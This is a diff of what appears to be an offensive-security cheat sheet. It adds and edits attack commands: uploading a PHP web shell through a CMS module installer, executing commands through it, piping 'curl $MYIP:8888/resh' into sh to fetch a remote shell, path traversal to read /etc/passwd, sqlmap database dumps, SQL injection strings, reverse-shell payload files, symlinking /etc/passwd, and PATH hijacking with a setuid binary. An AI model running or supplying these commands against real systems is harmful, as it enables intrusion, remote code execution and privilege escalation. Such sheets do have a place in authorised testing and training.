@@ -373,7 +373,9 @@ zip x.zip x.php
 curl -s -i -X POST -F "sendfile=@x.zip;type=application/zip" -F "submit=Upload" "http://$TARGET/admin.php?action=installmodule" -H "Cookie: PHPSESSID=$PHPSESSID" | grep -oP 'The module has been installed successfully.'
 
 +---------- Execute Command ----------+
-curl -G --path-as-is 'http://$TARGET/data/modules/x/x.php' --data-urlencode 'cmd=whoami /priv'
+wsh http://$TARGET/x.php
+curl $MYIP:8888/resh|sh
+curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'
 
 [*] Splunk
 curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
@@ -480,6 +482,7 @@ sqlmap -r request --batch --level 3 -dbs
 sqlmap -r request --batch --level 3 -D temp_db --tables
 sqlmap -r request --batch --level 3 -D temp_db -T users --columns
 sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump
+'
 ' OR 1=1 -- #
 OR 1=1 -- #
 AND 1=1 -- #
@@ -1411,6 +1414,7 @@ echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:8888/resh_
 
 -->> .sh
 echo -e '#!/bin/bash\ncurl $MYIP:8888/resh_5566|sh'
+echo 'bash -i'
 
 +---------- Symlink: Writeable Root File ----------+
 ln -sf /etc/passwd /var/log/below/error_root.log
@@ -1429,7 +1433,7 @@ echo '#include <unistd.h>\n#include <stdlib.h>\nint main() {\n  setuid(0);\n  se
 gcc x.c -o "$IMPOSTER_BINARY"
 
 -->> Create Imposter Directory for Binary
-mkdir -p ~/imposter; mv ~/"$IMPOSTER_BINARY" ~/imposter; chmod +x ~/imposter/"$IMPOSTER_BINARY"
+mkdir -p ~/imposter; mv "$IMPOSTER_BINARY" ~/imposter; chmod +x ~/imposter/"$IMPOSTER_BINARY"
 
 -->> Add Imposter Directory to PATH
 export PATH=~/imposter:$PATH
